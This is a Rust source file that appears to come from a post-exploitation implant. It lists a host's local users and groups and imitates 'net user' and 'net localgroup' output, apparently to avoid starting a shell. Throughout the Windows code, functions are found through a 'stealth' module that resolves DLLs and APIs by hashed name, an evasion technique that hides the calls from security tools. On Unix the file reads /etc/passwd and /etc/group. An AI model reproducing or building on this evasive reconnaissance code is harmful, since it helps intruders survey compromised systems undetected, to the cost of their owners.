// Local users / groups via NetAPI (no `net user` shell).

use crate::stealth;

#[derive(Debug, Clone)]
pub struct UserInfo {
    pub name: String,
    pub full_name: String,
    pub comment: String,
    pub flags: u32,
}

#[derive(Debug, Clone)]
pub struct GroupInfo {
    pub name: String,
    pub comment: String,
}

pub fn list_local_users() -> Result<Vec<UserInfo>, String> {
    #[cfg(windows)]
    {
        unsafe { list_users_win() }
    }
    #[cfg(not(windows))]
    {
        list_users_unix()
    }
}

pub fn list_local_groups() -> Result<Vec<GroupInfo>, String> {
    #[cfg(windows)]
    {
        unsafe { list_groups_win() }
    }
    #[cfg(not(windows))]
    {
        list_groups_unix()
    }
}

pub fn current_username() -> String {
    #[cfg(windows)]
    {
        unsafe { current_user_win().unwrap_or_else(|_| "unknown".into()) }
    }
    #[cfg(not(windows))]
    {
        std::env::var("USER")
            .or_else(|_| std::env::var("LOGNAME"))
            .unwrap_or_else(|_| "unknown".into())
    }
}

/// Classic `net user` style listing (human-readable).
pub fn format_users_text() -> Result<String, String> {
    let host = hostname_best_effort();
    let users = list_local_users()?;
    let mut out = format!("\r\nUser accounts for \\\\\\{}\r\n\r\n", host);
    out.push_str("-------------------------------------------------------------------------------\r\n");
    // three columns like net user
    let names: Vec<&str> = users.iter().map(|u| u.name.as_str()).collect();
    for chunk in names.chunks(3) {
        match chunk.len() {
            1 => out.push_str(&format!("{:<25}\r\n", chunk[0])),
            2 => out.push_str(&format!("{:<25}{:<25}\r\n", chunk[0], chunk[1])),
            _ => out.push_str(&format!(
                "{:<25}{:<25}{}\r\n",
                chunk[0], chunk[1], chunk[2]
            )),
        }
    }
    out.push_str("The command completed successfully.\r\n");
    Ok(out)
}

/// Classic `net localgroup` style listing.
pub fn format_groups_text() -> Result<String, String> {
    let host = hostname_best_effort();
    let groups = list_local_groups()?;
    let mut out = format!("\r\nAliases for \\\\\\{}\r\n\r\n", host);
    out.push_str("-------------------------------------------------------------------------------\r\n");
    for g in groups {
        out.push_str(&format!("*{}\r\n", g.name));
    }
    out.push_str("The command completed successfully.\r\n");
    Ok(out)
}

fn hostname_best_effort() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| {
            #[cfg(windows)]
            {
                current_username() // last resort placeholder
            }
            #[cfg(not(windows))]
            {
                "localhost".into()
            }
        })
}

#[cfg(windows)]
unsafe fn load_netapi() -> Result<usize, String> {
    let mut base = stealth::get_module_base(stealth::hash_module_name(b"netapi32.dll"));
    if base == 0 {
        let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
        if let Some(load) = stealth::get_api_addr(k32, stealth::hash_api_name(b"LoadLibraryA")) {
            let load_library: unsafe extern "system" fn(*const i8) -> usize =
                std::mem::transmute(load);
            base = load_library(b"netapi32.dll\0".as_ptr() as *const i8);
        }
    }
    if base == 0 {
        return Err("netapi32.dll not found".into());
    }
    Ok(base)
}

#[cfg(windows)]
#[repr(C)]
struct UserInfo1 {
    name: *mut u16,
    password: *mut u16,
    password_age: u32,
    priv_: u32,
    home_dir: *mut u16,
    comment: *mut u16,
    flags: u32,
    script_path: *mut u16,
}

#[cfg(windows)]
#[repr(C)]
struct LocalGroupInfo1 {
    name: *mut u16,
    comment: *mut u16,
}

#[cfg(windows)]
unsafe fn list_users_win() -> Result<Vec<UserInfo>, String> {
    let net = load_netapi()?;
    type NetUserEnumFn = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut *mut u8,
        u32,
        *mut u32,
        *mut u32,
        *mut u32,
    ) -> u32;
    type NetApiBufferFreeFn = unsafe extern "system" fn(*mut u8) -> u32;

    let net_user_enum: NetUserEnumFn = std::mem::transmute(
        stealth::get_api_addr(net, stealth::hash_api_name(b"NetUserEnum"))
            .ok_or("NetUserEnum")?,
    );
    let net_free: NetApiBufferFreeFn = std::mem::transmute(
        stealth::get_api_addr(net, stealth::hash_api_name(b"NetApiBufferFree"))
            .ok_or("NetApiBufferFree")?,
    );

    let mut buf: *mut u8 = std::ptr::null_mut();
    let mut entries_read: u32 = 0;
    let mut total: u32 = 0;
    let mut resume: u32 = 0;
    // FILTER_NORMAL_ACCOUNT = 2, level 1
    let status = net_user_enum(
        std::ptr::null(),
        1,
        2,
        &mut buf,
        0xFFFF_FFFF,
        &mut entries_read,
        &mut total,
        &mut resume,
    );
    if status != 0 && status != 234 /* NERR_BufTooSmall / ERROR_MORE_DATA */ {
        // 2221 etc.
        if buf.is_null() {
            return Err(format!("NetUserEnum failed: {}", status));
        }
    }
    if buf.is_null() {
        return Ok(Vec::new());
    }

    let mut out = Vec::new();
    let slice = std::slice::from_raw_parts(buf as *const UserInfo1, entries_read as usize);
    for u in slice {
        out.push(UserInfo {
            name: wstr(u.name),
            full_name: String::new(),
            comment: wstr(u.comment),
            flags: u.flags,
        });
    }
    net_free(buf);
    Ok(out)
}

#[cfg(windows)]
unsafe fn list_groups_win() -> Result<Vec<GroupInfo>, String> {
    let net = load_netapi()?;
    type NetLocalGroupEnumFn = unsafe extern "system" fn(
        *const u16,
        u32,
        *mut *mut u8,
        u32,
        *mut u32,
        *mut u32,
        *mut u32,
    ) -> u32;
    type NetApiBufferFreeFn = unsafe extern "system" fn(*mut u8) -> u32;

    let enum_fn: NetLocalGroupEnumFn = std::mem::transmute(
        stealth::get_api_addr(net, stealth::hash_api_name(b"NetLocalGroupEnum"))
            .ok_or("NetLocalGroupEnum")?,
    );
    let net_free: NetApiBufferFreeFn = std::mem::transmute(
        stealth::get_api_addr(net, stealth::hash_api_name(b"NetApiBufferFree"))
            .ok_or("NetApiBufferFree")?,
    );

    let mut buf: *mut u8 = std::ptr::null_mut();
    let mut entries_read: u32 = 0;
    let mut total: u32 = 0;
    let mut resume: u32 = 0;
    let status = enum_fn(
        std::ptr::null(),
        1,
        &mut buf,
        0xFFFF_FFFF,
        &mut entries_read,
        &mut total,
        &mut resume,
    );
    if status != 0 && buf.is_null() {
        return Err(format!("NetLocalGroupEnum failed: {}", status));
    }
    if buf.is_null() {
        return Ok(Vec::new());
    }
    let mut out = Vec::new();
    let slice = std::slice::from_raw_parts(buf as *const LocalGroupInfo1, entries_read as usize);
    for g in slice {
        out.push(GroupInfo {
            name: wstr(g.name),
            comment: wstr(g.comment),
        });
    }
    net_free(buf);
    Ok(out)
}

#[cfg(windows)]
unsafe fn current_user_win() -> Result<String, String> {
    // GetUserNameW is in advapi32
    let adv = {
        let mut b = stealth::get_module_base(stealth::hash_module_name(b"advapi32.dll"));
        if b == 0 {
            let k = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
            if let Some(load) = stealth::get_api_addr(k, stealth::hash_api_name(b"LoadLibraryA")) {
                let f: unsafe extern "system" fn(*const i8) -> usize = std::mem::transmute(load);
                b = f(b"advapi32.dll\0".as_ptr() as *const i8);
            }
        }
        b
    };
    type GetUserNameWFn = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
    let get_user: GetUserNameWFn = std::mem::transmute(
        stealth::get_api_addr(adv, stealth::hash_api_name(b"GetUserNameW"))
            .ok_or("GetUserNameW")?,
    );
    let mut buf = [0u16; 256];
    let mut len = buf.len() as u32;
    if get_user(buf.as_mut_ptr(), &mut len) == 0 {
        return Err("GetUserNameW failed".into());
    }
    let n = len.saturating_sub(1) as usize;
    Ok(String::from_utf16_lossy(&buf[..n]))
}

#[cfg(windows)]
unsafe fn wstr(p: *mut u16) -> String {
    if p.is_null() {
        return String::new();
    }
    let mut len = 0usize;
    while *p.add(len) != 0 && len < 512 {
        len += 1;
    }
    String::from_utf16_lossy(std::slice::from_raw_parts(p, len))
}

#[cfg(not(windows))]
fn list_users_unix() -> Result<Vec<UserInfo>, String> {
    let mut out = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let mut parts = line.split(':');
            let name = parts.next().unwrap_or("").to_string();
            let _ = parts.next();
            let _ = parts.next();
            let _ = parts.next();
            let comment = parts.next().unwrap_or("").to_string();
            if !name.is_empty() {
                out.push(UserInfo {
                    name,
                    full_name: String::new(),
                    comment,
                    flags: 0,
                });
            }
        }
    }
    Ok(out)
}

#[cfg(not(windows))]
fn list_groups_unix() -> Result<Vec<GroupInfo>, String> {
    let mut out = Vec::new();
    if let Ok(content) = std::fs::read_to_string("/etc/group") {
        for line in content.lines() {
            if line.starts_with('#') || line.is_empty() {
                continue;
            }
            let name = line.split(':').next().unwrap_or("").to_string();
            if !name.is_empty() {
                out.push(GroupInfo {
                    name,
                    comment: String::new(),
                });
            }
        }
    }
    Ok(out)
}
